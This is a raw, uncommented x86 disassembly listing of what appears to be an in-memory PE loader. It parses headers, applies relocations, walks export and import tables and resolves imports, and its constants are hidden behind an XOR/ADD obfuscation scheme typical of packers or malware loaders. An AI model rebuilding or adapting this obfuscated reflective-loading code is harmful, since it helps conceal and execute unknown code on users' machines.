  426c68:	mov    esi,DWORD PTR [esi+0x3c]
  426c6b:	lea    esi,[edi+esi*1+0x50]
  426c6f:	mov    edi,DWORD PTR [ecx]
  426c71:	add    edi,DWORD PTR [esi]
  426c73:	cmp    DWORD PTR [eax],edi
  426c75:	jae    0x426c83
  426c77:	mov    esi,DWORD PTR [ecx]
  426c79:	mov    ecx,DWORD PTR [eax]
  426c7b:	mov    edx,DWORD PTR [edx]
  426c7d:	sub    ecx,esi
  426c7f:	add    edx,ecx
  426c81:	mov    DWORD PTR [eax],edx
  426c83:	mov    eax,DWORD PTR [ebp+0xc]
  426c86:	jmp    0x426c8a
  426c88:	xor    eax,eax
  426c8a:	pop    edi
  426c8b:	pop    esi
  426c8c:	pop    ebx
  426c8d:	leave  
  426c8e:	ret    0x1c
  426c91:	push   ebp
  426c92:	mov    ebp,esp
  426c94:	sub    esp,0x1c
  426c97:	push   esi
  426c98:	mov    esi,eax
  426c9a:	mov    eax,DWORD PTR [ecx+0x190]
  426ca0:	cmp    DWORD PTR [eax],0x0
  426ca3:	je     0x426db3
  426ca9:	test   edx,edx
  426cab:	je     0x426db3
  426cb1:	test   esi,esi
  426cb3:	je     0x426db3
  426cb9:	mov    eax,DWORD PTR [esi+0x88]
  426cbf:	test   eax,eax
  426cc1:	je     0x426dae
  426cc7:	cmp    DWORD PTR [esi+0x8c],0x10
  426cce:	je     0x426dae
  426cd4:	cmp    DWORD PTR [esi+0x34],edx
  426cd7:	je     0x426dae
  426cdd:	mov    esi,DWORD PTR [ecx+0x18c]
  426ce3:	and    DWORD PTR [ebp-0x10],0x0
  426ce7:	mov    ecx,edx
  426ce9:	sub    ecx,DWORD PTR [esi]
  426ceb:	add    eax,edx
  426ced:	movzx  edx,WORD PTR [eax+0xc]
  426cf1:	mov    DWORD PTR [ebp-0x1c],ecx
  426cf4:	movzx  ecx,WORD PTR [eax+0xe]
  426cf8:	add    ecx,edx
  426cfa:	je     0x426dae
  426d00:	lea    ecx,[eax+0x14]
  426d03:	push   ebx
  426d04:	mov    DWORD PTR [ebp-0x18],ecx
  426d07:	mov    esi,0x7fffffff
  426d0c:	push   edi
  426d0d:	test   DWORD PTR [ecx],esi
  426d0f:	je     0x426d90
  426d11:	mov    edx,DWORD PTR [ecx]
  426d13:	and    DWORD PTR [ebp-0xc],0x0
  426d17:	and    edx,esi
  426d19:	add    edx,eax
  426d1b:	movzx  edi,WORD PTR [edx+0xe]
  426d1f:	movzx  ebx,WORD PTR [edx+0xc]
  426d23:	add    edi,ebx
  426d25:	je     0x426d90
  426d27:	lea    ecx,[edx+0x14]
  426d2a:	mov    DWORD PTR [ebp-0x14],ecx
  426d2d:	test   DWORD PTR [ecx],esi
  426d2f:	je     0x426d72
  426d31:	mov    ecx,DWORD PTR [ecx]
  426d33:	and    DWORD PTR [ebp-0x8],0x0
  426d37:	and    ecx,esi
  426d39:	add    ecx,eax
  426d3b:	movzx  edi,WORD PTR [ecx+0xe]
  426d3f:	movzx  ebx,WORD PTR [ecx+0xc]
  426d43:	add    edi,ebx
  426d45:	je     0x426d72
  426d47:	lea    edi,[ecx+0x14]
  426d4a:	mov    DWORD PTR [ebp-0x4],edi
  426d4d:	mov    edi,DWORD PTR [ebp-0x4]
  426d50:	mov    edi,DWORD PTR [edi]
  426d52:	test   edi,edi
  426d54:	je     0x426d5c
  426d56:	mov    ebx,DWORD PTR [ebp-0x1c]
  426d59:	add    DWORD PTR [edi+eax*1],ebx
  426d5c:	movzx  edi,WORD PTR [ecx+0xe]
  426d60:	movzx  ebx,WORD PTR [ecx+0xc]
  426d64:	inc    DWORD PTR [ebp-0x8]
  426d67:	add    DWORD PTR [ebp-0x4],0x8
  426d6b:	add    edi,ebx
  426d6d:	cmp    DWORD PTR [ebp-0x8],edi
  426d70:	jb     0x426d4d
  426d72:	movzx  edi,WORD PTR [edx+0xe]
  426d76:	movzx  ebx,WORD PTR [edx+0xc]
  426d7a:	mov    ecx,DWORD PTR [ebp-0x14]
  426d7d:	inc    DWORD PTR [ebp-0xc]
  426d80:	add    ecx,0x8
  426d83:	add    edi,ebx
  426d85:	mov    DWORD PTR [ebp-0x14],ecx
  426d88:	cmp    DWORD PTR [ebp-0xc],edi
  426d8b:	jb     0x426d2d
  426d8d:	mov    ecx,DWORD PTR [ebp-0x18]
  426d90:	movzx  edx,WORD PTR [eax+0xe]
  426d94:	movzx  edi,WORD PTR [eax+0xc]
  426d98:	inc    DWORD PTR [ebp-0x10]
  426d9b:	add    ecx,0x8
  426d9e:	add    edx,edi
  426da0:	mov    DWORD PTR [ebp-0x18],ecx
  426da3:	cmp    DWORD PTR [ebp-0x10],edx
  426da6:	jb     0x426d0d
  426dac:	pop    edi
  426dad:	pop    ebx
  426dae:	xor    eax,eax
  426db0:	inc    eax
  426db1:	jmp    0x426db5
  426db3:	xor    eax,eax
  426db5:	pop    esi
  426db6:	leave  
  426db7:	ret    
  426db8:	push   ebp
  426db9:	mov    ebp,esp
  426dbb:	mov    ecx,DWORD PTR [ecx+0x190]
  426dc1:	mov    eax,DWORD PTR [ebp+0xc]
  426dc4:	sub    esp,0x10
  426dc7:	push   ebx
  426dc8:	xor    ebx,ebx
  426dca:	push   esi
  426dcb:	push   edi
  426dcc:	cmp    DWORD PTR [ecx],ebx
  426dce:	je     0x426e56
  426dd4:	cmp    eax,ebx
  426dd6:	je     0x426e56
  426dd8:	cmp    DWORD PTR [eax+0x78],ebx
  426ddb:	jne    0x426de2
  426ddd:	xor    eax,eax
  426ddf:	inc    eax
  426de0:	jmp    0x426e58
  426de2:	mov    eax,DWORD PTR [eax+0x78]
  426de5:	add    eax,DWORD PTR [ebp+0x8]
  426de8:	mov    ecx,DWORD PTR [eax+0x1c]
  426deb:	mov    edx,DWORD PTR [eax+0x24]
  426dee:	mov    esi,DWORD PTR [eax+0x14]
  426df1:	mov    edi,DWORD PTR [eax+0x18]
  426df4:	add    ecx,DWORD PTR [ebp+0x8]
  426df7:	add    edx,DWORD PTR [ebp+0x8]
  426dfa:	mov    DWORD PTR [ebp-0x4],esi
  426dfd:	cmp    esi,edi
  426dff:	ja     0x426e04
  426e01:	mov    DWORD PTR [ebp-0x4],edi
  426e04:	mov    DWORD PTR [ebp-0x8],ebx
  426e07:	cmp    DWORD PTR [ebp-0x4],ebx
  426e0a:	jbe    0x426ddd
  426e0c:	cmp    ebx,DWORD PTR [eax+0x14]
  426e0f:	jae    0x426e17
  426e11:	movzx  esi,WORD PTR [edx+ebx*2]
  426e15:	jmp    0x426e19
  426e17:	mov    esi,ebx
  426e19:	lea    esi,[ecx+esi*4]
  426e1c:	mov    edi,DWORD PTR [esi]
  426e1e:	test   edi,edi
  426e20:	je     0x426e4b
  426e22:	add    edi,DWORD PTR [ebp+0x8]
  426e25:	mov    DWORD PTR [ebp-0x10],edi
  426e28:	cmp    edi,eax
  426e2a:	jbe    0x426e3c
  426e2c:	mov    ebx,DWORD PTR [ebp+0xc]
  426e2f:	mov    ebx,DWORD PTR [ebx+0x7c]
  426e32:	add    ebx,eax
  426e34:	cmp    edi,ebx
  426e36:	jae    0x426e3c
  426e38:	mov    esi,DWORD PTR [esi]
  426e3a:	jmp    0x426e44
  426e3c:	sub    edi,DWORD PTR [ebp+0x8]
  426e3f:	mov    DWORD PTR [esi],edi
  426e41:	mov    esi,DWORD PTR [ebp-0x10]
  426e44:	test   esi,esi
  426e46:	je     0x426e56
  426e48:	mov    ebx,DWORD PTR [ebp-0x8]
  426e4b:	inc    ebx
  426e4c:	mov    DWORD PTR [ebp-0x8],ebx
  426e4f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426e52:	jb     0x426e0c
  426e54:	jmp    0x426ddd
  426e56:	xor    eax,eax
  426e58:	pop    edi
  426e59:	pop    esi
  426e5a:	pop    ebx
  426e5b:	leave  
  426e5c:	ret    0x8
  426e5f:	push   ebp
  426e60:	mov    ebp,esp
  426e62:	sub    esp,0x2c
  426e65:	mov    edx,0xf89c85a5
  426e6a:	mov    DWORD PTR [ebp-0x4],edx
  426e6d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426e74:	mov    eax,DWORD PTR [ebp-0x4]
  426e77:	mov    ecx,DWORD PTR [ebp-0x4]
  426e7a:	mov    ecx,DWORD PTR [ebp-0x4]
  426e7d:	mov    ecx,DWORD PTR [ebp-0x4]
  426e80:	mov    ecx,DWORD PTR [ebp-0x4]
  426e83:	mov    ecx,DWORD PTR [ebp-0x4]
  426e86:	push   ebx
  426e87:	mov    ebx,DWORD PTR [ebp+0x10]
  426e8a:	push   esi
  426e8b:	mov    esi,0x75108aa
  426e90:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426e97:	mov    ecx,DWORD PTR [ebp-0x4]
  426e9a:	mov    ebx,DWORD PTR [ebx+0x190]
  426ea0:	push   edi
  426ea1:	mov    edi,0x3272f1
  426ea6:	xor    ecx,esi
  426ea8:	xor    eax,esi
  426eaa:	add    eax,edi
  426eac:	add    ecx,edi
  426eae:	mov    DWORD PTR [ebp-0x18],eax
  426eb1:	cmp    ecx,DWORD PTR [ebx]
  426eb3:	je     0x427134
  426eb9:	mov    ebx,DWORD PTR [ebp-0x4]
  426ebc:	mov    ecx,DWORD PTR [ebp+0xc]
  426ebf:	xor    ebx,esi
  426ec1:	add    ebx,edi
  426ec3:	cmp    ebx,ecx
  426ec5:	je     0x427134
  426ecb:	mov    ebx,DWORD PTR [ebp-0x4]
  426ece:	mov    ecx,DWORD PTR [ecx+0x80]
  426ed4:	xor    ebx,esi
  426ed6:	add    ebx,edi
  426ed8:	cmp    ecx,ebx
  426eda:	je     0x42712f
  426ee0:	add    ecx,DWORD PTR [ebp+0x8]
  426ee3:	mov    DWORD PTR [ebp-0x2c],ecx
  426ee6:	mov    ebx,edx
  426ee8:	xor    ebx,esi
  426eea:	add    ebx,edi
  426eec:	mov    DWORD PTR [ebp-0x10],ebx
  426eef:	mov    ebx,DWORD PTR [ebp-0x10]
  426ef2:	cmp    ebx,edx
  426ef4:	je     0x426f08
  426ef6:	mov    edx,DWORD PTR [ebp-0x10]
  426ef9:	mov    ebx,DWORD PTR [ebp-0x4]
  426efc:	imul   edx,edx,0x14
  426eff:	xor    ebx,esi
  426f01:	add    ebx,edi
  426f03:	cmp    DWORD PTR [edx+ecx*1],ebx
  426f06:	jne    0x426f1f
  426f08:	mov    edx,DWORD PTR [ebp-0x10]
  426f0b:	mov    ebx,DWORD PTR [ebp-0x4]
  426f0e:	imul   edx,edx,0x14
  426f11:	xor    ebx,esi
  426f13:	add    ebx,edi
  426f15:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426f19:	je     0x427121
  426f1f:	mov    eax,DWORD PTR [ebp-0x4]
  426f22:	mov    ebx,DWORD PTR [ebp-0x4]
  426f25:	mov    eax,DWORD PTR [ebp-0x10]
  426f28:	imul   eax,eax,0x14
  426f2b:	add    eax,ecx
  426f2d:	mov    ecx,DWORD PTR [eax+0x10]
  426f30:	add    ecx,DWORD PTR [ebp+0x8]
  426f33:	xor    ebx,esi
  426f35:	mov    DWORD PTR [ebp-0x1c],ecx
  426f38:	mov    ecx,DWORD PTR [ebp-0x4]
  426f3b:	mov    edx,DWORD PTR [ebp-0x4]
  426f3e:	xor    ecx,esi
  426f40:	add    ecx,edi
  426f42:	xor    edx,esi
  426f44:	mov    DWORD PTR [ebp-0x24],ecx
  426f47:	mov    ecx,DWORD PTR [eax]
  426f49:	add    edx,edi
  426f4b:	add    ebx,edi
  426f4d:	cmp    ecx,edx
  426f4f:	je     0x426f57
  426f51:	add    ecx,DWORD PTR [ebp+0x8]
  426f54:	mov    DWORD PTR [ebp-0x24],ecx
  426f57:	mov    ecx,DWORD PTR [ebp-0x4]
  426f5a:	xor    ecx,esi
  426f5c:	add    ecx,DWORD PTR [eax+0xc]
  426f5f:	mov    eax,DWORD PTR [ebp+0x8]
  426f62:	lea    eax,[ecx+eax*1+0x3272f1]
  426f69:	mov    DWORD PTR [ebp+0xc],eax
  426f6c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426f73:	mov    eax,DWORD PTR [ebp+0x10]
  426f76:	push   DWORD PTR [ebp+0xc]
  426f79:	mov    eax,DWORD PTR [eax+0x1e0]
  426f7f:	call   DWORD PTR [eax]
  426f81:	mov    ecx,DWORD PTR [ebp-0x4]
  426f84:	xor    ecx,esi
  426f86:	add    ecx,edi
  426f88:	mov    DWORD PTR [ebp-0xc],eax
  426f8b:	cmp    ecx,eax
  426f8d:	jne    0x426fa1
  426f8f:	mov    eax,DWORD PTR [ebp+0x10]
  426f92:	push   DWORD PTR [ebp+0xc]
  426f95:	mov    eax,DWORD PTR [eax+0x1e0]
  426f9b:	call   DWORD PTR [eax+0xc]
  426f9e:	mov    DWORD PTR [ebp-0xc],eax
  426fa1:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426fa8:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426faf:	mov    eax,DWORD PTR [ebp-0x4]
  426fb2:	xor    eax,esi
  426fb4:	add    eax,edi
  426fb6:	cmp    eax,DWORD PTR [ebp-0xc]
  426fb9:	jne    0x426fde
  426fbb:	mov    eax,DWORD PTR [ebp-0x8]
  426fbe:	mov    ecx,DWORD PTR [ebp-0x20]
  426fc1:	xor    eax,esi
  426fc3:	xor    ecx,esi
  426fc5:	lea    ebx,[ebx+eax*1+0x3272f1]
  426fcc:	mov    eax,DWORD PTR [ebp+0x10]
  426fcf:	mov    eax,DWORD PTR [eax+0x1e0]
  426fd5:	add    ecx,edi
  426fd7:	imul   ecx,ebx
  426fda:	push   ecx
  426fdb:	call   DWORD PTR [eax+0x24]
  426fde:	mov    eax,DWORD PTR [ebp-0x4]
  426fe1:	xor    eax,esi
  426fe3:	add    eax,edi
  426fe5:	cmp    eax,DWORD PTR [ebp-0xc]
  426fe8:	jne    0x426ff9
  426fea:	mov    eax,DWORD PTR [ebp-0x28]
  426fed:	xor    eax,esi
  426fef:	add    eax,edi
  426ff1:	cmp    ebx,eax
  426ff3:	jbe    0x426f73
  426ff9:	mov    eax,DWORD PTR [ebp-0x4]
  426ffc:	xor    eax,esi
  426ffe:	add    eax,edi
  427000:	cmp    eax,DWORD PTR [ebp-0xc]
  427003:	jne    0x42701c
  427005:	mov    eax,DWORD PTR [ebp-0x8]
  427008:	mov    ecx,DWORD PTR [ebp-0x18]
  42700b:	xor    eax,esi
  42700d:	lea    eax,[ecx+eax*1+0x3272f1]
  427014:	mov    DWORD PTR [ebp-0x18],eax
  427017:	jmp    0x42710b
  42701c:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427023:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  42702a:	mov    ebx,DWORD PTR [ebp-0x4]
  42702d:	xor    ebx,esi
  42702f:	add    ebx,edi
  427031:	jmp    0x4270f8
  427036:	mov    eax,DWORD PTR [ebp-0x4]
  427039:	xor    eax,esi
  42703b:	add    eax,edi
  42703d:	mov    DWORD PTR [ebp-0x14],eax
  427040:	mov    eax,DWORD PTR [ebp-0x4]
  427043:	xor    eax,esi
  427045:	add    eax,edi
  427047:	mov    DWORD PTR [ebp+0xc],eax
  42704a:	mov    ecx,DWORD PTR [ebp-0x4]
  42704d:	mov    eax,DWORD PTR [ebp-0x24]
  427050:	xor    ecx,esi
  427052:	add    ecx,edi
  427054:	cmp    ecx,eax
  427056:	je     0x42705e
  427058:	mov    eax,DWORD PTR [eax+ebx*4]
  42705b:	mov    DWORD PTR [ebp-0x14],eax
  42705e:	mov    eax,DWORD PTR [ebp-0x1c]
  427061:	mov    eax,DWORD PTR [eax+ebx*4]
  427064:	mov    DWORD PTR [ebp+0xc],eax
  427067:	mov    eax,DWORD PTR [ebp-0x4]
  42706a:	mov    ecx,DWORD PTR [ebp-0x14]
  42706d:	xor    eax,esi
  42706f:	add    eax,edi
  427071:	cmp    eax,ecx
  427073:	je     0x42709e
  427075:	mov    eax,DWORD PTR [ebp-0x4]
  427078:	mov    ecx,DWORD PTR [ebp-0x14]
  42707b:	xor    eax,esi
  42707d:	add    eax,edi
  42707f:	shr    ecx,0x1f
  427082:	cmp    eax,ecx
  427084:	je     0x42709e
  427086:	mov    ecx,DWORD PTR [ebp-0x14]
  427089:	mov    eax,DWORD PTR [ebp+0x10]
  42708c:	mov    eax,DWORD PTR [eax+0x1e0]
  427092:	movzx  ecx,cx
  427095:	push   ecx
  427096:	push   DWORD PTR [ebp-0xc]
  427099:	call   DWORD PTR [eax+0x8]
  42709c:	jmp    0x4270b7
  42709e:	mov    eax,DWORD PTR [ebp+0xc]
  4270a1:	add    eax,DWORD PTR [ebp+0x8]
  4270a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4270a7:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4270ad:	add    eax,0x2
  4270b0:	push   eax
  4270b1:	push   DWORD PTR [ebp-0xc]
  4270b4:	call   DWORD PTR [ecx+0x8]
  4270b7:	mov    DWORD PTR [ebp+0xc],eax
  4270ba:	mov    eax,DWORD PTR [ebp-0x4]
  4270bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4270c0:	xor    eax,esi
  4270c2:	add    eax,edi
  4270c4:	cmp    eax,ecx
  4270c6:	mov    eax,DWORD PTR [ebp-0x8]
  4270c9:	jne    0x4270dc
  4270cb:	mov    ecx,DWORD PTR [ebp-0x18]
  4270ce:	xor    eax,esi
  4270d0:	lea    eax,[ecx+eax*1+0x3272f1]
  4270d7:	mov    DWORD PTR [ebp-0x18],eax
  4270da:	jmp    0x4270ec
  4270dc:	mov    ecx,DWORD PTR [ebp+0xc]
  4270df:	xor    eax,esi
  4270e1:	add    eax,edi
  4270e3:	imul   eax,ecx
  4270e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270e9:	mov    DWORD PTR [ecx+ebx*4],eax
  4270ec:	mov    eax,DWORD PTR [ebp-0x8]
  4270ef:	xor    eax,esi
  4270f1:	lea    ebx,[ebx+eax*1+0x3272f1]
  4270f8:	mov    eax,DWORD PTR [ebp-0x4]
  4270fb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270fe:	xor    eax,esi
  427100:	add    eax,edi
  427102:	cmp    DWORD PTR [ecx+ebx*4],eax
  427105:	jne    0x427036
  42710b:	mov    edx,DWORD PTR [ebp-0x10]
  42710e:	mov    ecx,DWORD PTR [ebp-0x2c]
  427111:	mov    eax,DWORD PTR [ebp-0x18]
  427114:	sub    edx,0x3272f0
  42711a:	xor    edx,esi
  42711c:	jmp    0x426ee6
  427121:	mov    ecx,DWORD PTR [ebp-0x4]
  427124:	xor    ecx,esi
  427126:	add    ecx,edi
  427128:	cmp    eax,ecx
  42712a:	mov    eax,DWORD PTR [ebp-0x4]
  42712d:	jne    0x427137
  42712f:	mov    eax,DWORD PTR [ebp-0x8]
  427132:	jmp    0x427137
  427134:	mov    eax,DWORD PTR [ebp-0x4]
  427137:	xor    eax,esi
  427139:	add    eax,edi
  42713b:	pop    edi
  42713c:	pop    esi
  42713d:	pop    ebx
  42713e:	leave  
  42713f:	ret    0xc
  427142:	push   ebp
  427143:	mov    ebp,esp
  427145:	sub    esp,0x28
  427148:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42714f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427156:	mov    eax,DWORD PTR [ebp+0xc]
  427159:	mov    DWORD PTR [ebp+0xc],eax
  42715c:	push   esi
  42715d:	mov    eax,eax
  42715f:	mov    eax,DWORD PTR [ebp-0x4]
  427162:	mov    esi,DWORD PTR [ebp+0x8]
  427165:	mov    ecx,0x75108aa
  42716a:	xor    eax,ecx
  42716c:	mov    edx,0x3272f1
  427171:	add    eax,edx
  427173:	cmp    esi,eax
  427175:	je     0x42729c
  42717b:	mov    eax,DWORD PTR [ebp+0x8]
  42717e:	mov    esi,DWORD PTR [ebp+0x8]
  427181:	add    esi,DWORD PTR [eax+0x3c]
  427184:	push   edi
  427185:	mov    DWORD PTR [ebp+0xc],esi
  427188:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42718f:	mov    eax,DWORD PTR [ebp-0x1c]
  427192:	mov    esi,DWORD PTR [ebp-0x4]
  427195:	mov    edi,DWORD PTR [ebp+0xc]
  427198:	xor    esi,ecx
  42719a:	xor    eax,ecx
  42719c:	add    esi,edx
  42719e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  4271a5:	je     0x427296
  4271ab:	mov    esi,DWORD PTR [ebp+0xc]
  4271ae:	mov    eax,DWORD PTR [ebp+0x8]
  4271b1:	add    eax,DWORD PTR [esi+0xa0]
  4271b7:	mov    esi,DWORD PTR [ebp+0x8]
  4271ba:	mov    edi,DWORD PTR [ebp+0xc]
  4271bd:	sub    esi,DWORD PTR [edi+0x34]
  4271c0:	mov    edi,DWORD PTR [ebp-0x4]
  4271c3:	xor    edi,ecx
  4271c5:	add    edi,edx
  4271c7:	mov    DWORD PTR [ebp-0x24],esi
  4271ca:	cmp    esi,edi
  4271cc:	je     0x427296
  4271d2:	mov    esi,DWORD PTR [ebp-0x4]
  4271d5:	xor    esi,ecx
  4271d7:	add    esi,edx
  4271d9:	mov    DWORD PTR [ebp-0x8],esi
  4271dc:	push   ebx
  4271dd:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4271e4:	jmp    0x427280
  4271e9:	mov    esi,DWORD PTR [ebp-0x4]
  4271ec:	xor    esi,ecx
  4271ee:	lea    edi,[ebx-0x8]
  4271f1:	add    esi,edx
  4271f3:	shr    edi,1
  4271f5:	cmp    esi,edi
  4271f7:	jae    0x427266
  4271f9:	sub    edi,esi
  4271fb:	lea    ebx,[eax+esi*2+0x8]
  4271ff:	mov    DWORD PTR [ebp-0x18],edi
  427202:	movzx  esi,WORD PTR [ebx]
  427205:	and    esi,0xfff
  42720b:	mov    DWORD PTR [ebp-0x14],esi
  42720e:	mov    edi,DWORD PTR [ebp-0x14]
  427211:	mov    esi,DWORD PTR [eax]
  427213:	sub    esi,edx
  427215:	add    edi,esi
  427217:	movzx  esi,WORD PTR [ebx]
  42721a:	shr    esi,0xc
  42721d:	xor    edi,ecx
  42721f:	mov    DWORD PTR [ebp-0x20],edi
  427222:	mov    DWORD PTR [ebp-0x14],esi
  427225:	mov    esi,DWORD PTR [ebp-0x20]
  427228:	mov    edi,DWORD PTR [ebp+0x8]
  42722b:	xor    esi,ecx
  42722d:	lea    esi,[esi+edi*1+0x3272f1]
  427234:	mov    DWORD PTR [ebp-0x20],esi
  427237:	mov    esi,DWORD PTR [ebp-0x10]
  42723a:	mov    edi,DWORD PTR [ebp-0x14]
  42723d:	xor    esi,ecx
  42723f:	add    esi,edx
  427241:	cmp    edi,esi
  427243:	jne    0x42725b
  427245:	mov    esi,DWORD PTR [ebp-0x10]
  427248:	mov    edi,DWORD PTR [ebp-0x14]
  42724b:	xor    esi,ecx
  42724d:	add    esi,edx
  42724f:	cmp    edi,esi
  427251:	jne    0x42725b
  427253:	mov    esi,DWORD PTR [ebp-0x20]
  427256:	mov    edi,DWORD PTR [ebp-0x24]
  427259:	add    DWORD PTR [esi],edi
  42725b:	add    ebx,0x2
  42725e:	dec    DWORD PTR [ebp-0x18]
  427261:	jne    0x427202
  427263:	mov    ebx,DWORD PTR [ebp-0xc]
  427266:	add    DWORD PTR [ebp-0x8],ebx
  427269:	mov    esi,DWORD PTR [ebp-0x1c]
  42726c:	mov    edi,DWORD PTR [ebp-0x8]
  42726f:	mov    ebx,DWORD PTR [ebp+0xc]
  427272:	xor    esi,ecx
  427274:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42727b:	jae    0x427295
  42727d:	add    eax,DWORD PTR [ebp-0xc]
  427280:	mov    esi,DWORD PTR [ebp-0x4]
  427283:	mov    ebx,DWORD PTR [eax+0x4]
  427286:	xor    esi,ecx
  427288:	add    esi,edx
  42728a:	mov    DWORD PTR [ebp-0xc],ebx
  42728d:	cmp    ebx,esi
  42728f:	jne    0x4271e9
  427295:	pop    ebx
  427296:	mov    eax,DWORD PTR [ebp-0x28]
  427299:	pop    edi
  42729a:	jmp    0x42729f
  42729c:	mov    eax,DWORD PTR [ebp-0x4]
  42729f:	xor    eax,ecx
  4272a1:	add    eax,edx
  4272a3:	pop    esi
  4272a4:	leave  
  4272a5:	ret    0x8
  4272a8:	push   ebp
  4272a9:	mov    ebp,esp
  4272ab:	sub    esp,0xd8
  4272b1:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4272b8:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  4272bf:	mov    eax,DWORD PTR [ebp-0x4]
  4272c2:	push   ebx
  4272c3:	push   esi
  4272c4:	mov    esi,0x75108aa
  4272c9:	xor    eax,esi
  4272cb:	push   edi
  4272cc:	mov    edi,0x3272f1
  4272d1:	add    eax,edi
  4272d3:	mov    DWORD PTR [ebp-0x18],eax
  4272d6:	mov    eax,DWORD PTR [ebp-0x4]
  4272d9:	xor    eax,esi
  4272db:	add    eax,edi
  4272dd:	mov    DWORD PTR [ebp-0x8],eax
  4272e0:	mov    ebx,DWORD PTR [ebp+0x20]
  4272e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4272e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4272e9:	xor    eax,ecx
  4272eb:	mov    DWORD PTR [ebp-0x1c],eax
  4272ee:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4272f5:	mov    eax,DWORD PTR [ebp-0xc]
  4272f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4272fb:	xor    eax,ecx
  4272fd:	mov    DWORD PTR [ebp-0xc],eax
  427300:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427307:	mov    eax,DWORD PTR [ebp-0x10]
  42730a:	mov    ecx,DWORD PTR [ebp-0x10]
  42730d:	xor    eax,ecx
  42730f:	mov    DWORD PTR [ebp-0x10],eax
  427312:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  427319:	mov    eax,DWORD PTR [ebp-0x28]
  42731c:	mov    ecx,DWORD PTR [ebp-0x28]
  42731f:	xor    eax,ecx
  427321:	mov    DWORD PTR [ebp-0x28],eax
  427324:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  42732b:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427332:	mov    eax,DWORD PTR [ebp+0x8]
  427335:	test   eax,eax
  427337:	je     0x4277c0
  42733d:	mov    eax,DWORD PTR [ebp+0xc]
  427340:	test   eax,eax
  427342:	je     0x4277c0
  427348:	mov    eax,DWORD PTR [ebp+0x18]
  42734b:	test   eax,eax
  42734d:	je     0x4277c0
  427353:	mov    eax,DWORD PTR [ebp+0x20]
  427356:	mov    ecx,DWORD PTR [ebp+0x8]
  427359:	xor    eax,0x8aa
  42735e:	add    eax,0x72f1
  427363:	cmp    WORD PTR [ecx],ax
  427366:	jne    0x4277c0
  42736c:	mov    eax,DWORD PTR [ebp-0x4]
  42736f:	xor    eax,esi
  427371:	add    eax,edi
  427373:	mov    DWORD PTR [ebp-0x30],eax
  427376:	mov    eax,DWORD PTR [ebp-0x4]
  427379:	mov    ecx,DWORD PTR [ebp+0x8]
  42737c:	mov    eax,DWORD PTR [ebp+0x8]
  42737f:	add    eax,DWORD PTR [ecx+0x3c]
  427382:	mov    DWORD PTR [ebp+0xc],eax
  427385:	mov    eax,DWORD PTR [eax+0x50]
  427388:	test   eax,eax
  42738a:	je     0x4277c0
  427390:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427397:	mov    eax,DWORD PTR [ebp-0x2c]
  42739a:	xor    eax,esi
  42739c:	add    eax,edi
  42739e:	mov    DWORD PTR [ebp-0x2c],eax
  4273a1:	mov    eax,DWORD PTR [ebp-0x4]
  4273a4:	mov    eax,DWORD PTR [ebx+0x190]
  4273aa:	mov    ecx,DWORD PTR [eax]
  4273ac:	mov    ecx,DWORD PTR [ecx+0x3c]
  4273af:	add    ecx,DWORD PTR [eax]
  4273b1:	mov    eax,DWORD PTR [ebp-0x4]
  4273b4:	mov    eax,DWORD PTR [ebx+0x18c]
  4273ba:	mov    edx,DWORD PTR [eax]
  4273bc:	mov    DWORD PTR [ebp-0x20],ecx
  4273bf:	mov    DWORD PTR [ebp+0x20],edx
  4273c2:	cmp    edx,edx
  4273c4:	jne    0x4273f8
  4273c6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4273cc:	lea    edx,[ebp-0x18]
  4273cf:	push   edx
  4273d0:	mov    edx,DWORD PTR [ebp-0xc]
  4273d3:	xor    edx,esi
  4273d5:	add    edx,edi
  4273d7:	push   edx
  4273d8:	push   DWORD PTR [ecx+0x50]
  4273db:	push   DWORD PTR [ebp+0x20]
  4273de:	call   DWORD PTR [eax+0x1c]
  4273e1:	mov    eax,DWORD PTR [ebp-0x20]
  4273e4:	mov    ecx,DWORD PTR [eax+0x54]
  4273e7:	mov    eax,DWORD PTR [eax+0x50]
  4273ea:	sub    eax,ecx
  4273ec:	add    ecx,DWORD PTR [ebp+0x20]
  4273ef:	push   ecx
  4273f0:	call   0x427d5b
  4273f5:	mov    edx,DWORD PTR [ebp+0x20]
  4273f8:	mov    eax,DWORD PTR [ebx+0x194]
  4273fe:	mov    DWORD PTR [eax],edx
  427400:	mov    eax,DWORD PTR [ebp+0xc]
  427403:	push   DWORD PTR [eax+0x54]
  427406:	push   DWORD PTR [ebp+0x8]
  427409:	push   edx
  42740a:	call   0x427c51
  42740f:	mov    ecx,DWORD PTR [ebp+0x20]
  427412:	mov    eax,DWORD PTR [ecx+0x3c]
  427415:	add    eax,ecx
  427417:	movzx  ecx,WORD PTR [eax+0x14]
  42741b:	lea    ecx,[ecx+eax*1+0x18]
  42741f:	mov    DWORD PTR [ebp+0x18],ecx
